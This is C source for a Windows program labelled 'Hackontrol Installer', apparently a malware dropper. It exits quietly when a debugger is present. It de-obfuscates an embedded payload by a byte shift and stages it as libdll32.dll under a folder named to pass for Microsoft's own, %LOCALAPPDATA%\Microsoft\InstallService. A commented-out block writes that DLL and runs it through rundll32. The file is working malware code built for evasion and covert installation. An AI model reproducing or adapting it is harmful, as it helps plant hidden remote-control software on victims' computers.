#include <stdio.h>
#include <Windows.h>
#include <ShlObj_core.h>
#include "resource.h"

#define PATH L"%LOCALAPPDATA%\\Microsoft\\InstallService"
#define FILE L"libdll32.dll"

typedef struct {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
} *PPEB;

static void displayError(const LPCWSTR function, const DWORD code, const HANDLE heap) {
	LPWSTR message;

	if(!FormatMessageW(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS | FORMAT_MESSAGE_MAX_WIDTH_MASK, NULL, code, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPWSTR) &message, 0, NULL)) {
		return;
	}

	LPCWSTR format = L"%ws() failed. Error code: 0x%08X Message:\n%ws";
	int length = _scwprintf(format, function, code, message);

	if(length < 1) {
		LocalFree(message);
		return;
	}

	LPWSTR buffer = HeapAlloc(heap, 0, (length + 1) * sizeof(WCHAR));

	if(!buffer) {
		LocalFree(message);
		return;
	}

	length = swprintf_s(buffer, length + 1, format, function, code, message);
	LocalFree(message);

	if(length == -1) {
		HeapFree(heap, 0, buffer);
		return;
	}

	buffer[length] = 0;
	MessageBoxW(NULL, buffer, L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	HeapFree(heap, 0, buffer);
}

int main(int argc, char** argv) {
	PPEB block = (PPEB) __readgsqword(0x60);

	if(!block || block->BeingDebugged) {
		return 0;
	}

	HANDLE heap = GetProcessHeap();

	if(!heap) {
		MessageBoxW(NULL, L"Error: No process heap available", L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		return 1;
	}

	DWORD length = ExpandEnvironmentStringsW(PATH, NULL, 0);

	if(!length) {
		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
		return 1;
	}

	printf("Finding resource\n");
	HRSRC handle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!handle) {
		displayError(L"FindResourceW", GetLastError(), heap);
		return 1;
	}

	DWORD size = SizeofResource(NULL, handle);

	if(!size) {
		displayError(L"SizeofResource", GetLastError(), heap);
		return 1;
	}

	printf("Resource size: %lu bytes\n", size);
	HGLOBAL resource = LoadResource(NULL, handle);

	if(!resource) {
		displayError(L"LoadResource", GetLastError(), heap);
		return 1;
	}

	PBYTE data = LockResource(resource);

	if(!data) {
		displayError(L"LockResource", GetLastError(), heap);
		return 1;
	}

	LPWSTR pathHome = HeapAlloc(heap, 0, sizeof(WCHAR) * length);

	if(!pathHome) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		return 1;
	}

	int codeExit = 1;

	if(!ExpandEnvironmentStringsW(PATH, pathHome, length)) {
		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
		goto freePathHome;
	}

	LPWSTR pathFile = HeapAlloc(heap, 0, sizeof(WCHAR) * length + sizeof(FILE));

	if(!pathFile) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		goto freePathHome;
	}

	memcpy(pathFile, pathHome, sizeof(WCHAR) * (length - 1));
	memcpy(pathFile + length, FILE, sizeof(FILE));
	pathFile[length - 1] = L'\\';
	PBYTE buffer = HeapAlloc(heap, 0, size);

	if(!buffer) {
		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
		goto freePathFile;
	}

	for(length = 0; length < size; length++) {
		buffer[length] = (data[length] - 18) % 0xFF;
	}

	printf("Create directory\n");
	length = SHCreateDirectoryExW(NULL, pathHome, NULL);

	if(length == ERROR_ALREADY_EXISTS || length == ERROR_FILE_EXISTS) {
		length = GetFileAttributesW(pathHome);

		if(length == INVALID_FILE_ATTRIBUTES) {
			displayError(L"GetFileAttributesW", GetLastError(), heap);
			goto freeBuffer;
		}

		if(length & FILE_ATTRIBUTE_DIRECTORY) {
			goto directoryExists;
		}

		printf("Directory name conflict\n");

		if(!DeleteFileW(pathHome)) {
			displayError(L"DeleteFileW", GetLastError(), heap);
			goto freeBuffer;
		}

		length = SHCreateDirectoryExW(NULL, pathHome, NULL);

		if(length != ERROR_SUCCESS) {
			displayError(L"SHCreateDirectoryExW", length, heap);
			goto freeBuffer;
		}
	} else if(length != ERROR_SUCCESS) {
		displayError(L"SHCreateDirectoryExW", length, heap);
		goto freeBuffer;
	}
directoryExists:
	printf("Finished\n");
	codeExit = 0;
freeBuffer:
	HeapFree(heap, 0, buffer);
freePathFile:
	HeapFree(heap, 0, pathFile);
freePathHome:
	HeapFree(heap, 0, pathHome);
	return codeExit;
}

/*#define FUNCTION_LIBDLL32 "Install"

int main(int argc, char** argv) {
	BOOL result = HackontrolWriteFile(fileLibdll32, buffer, size);
	error = GetLastError();
	LocalFree(buffer);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"HackontrolWriteFile");
		LocalFree(fileLibdll32);
		return 1;
	}

	printf("Loading DLL\n");
	result = KHOPANExecuteRundll32Function(fileLibdll32, FUNCTION_LIBDLL32, NULL, TRUE);
	error = GetLastError();
	LocalFree(fileLibdll32);

	if(!result) {
		KHOPANERRORMESSAGE_WIN32(error, L"KHOPANExecuteRundll32Function");
		return 1;
	}

	return 0;
}*/
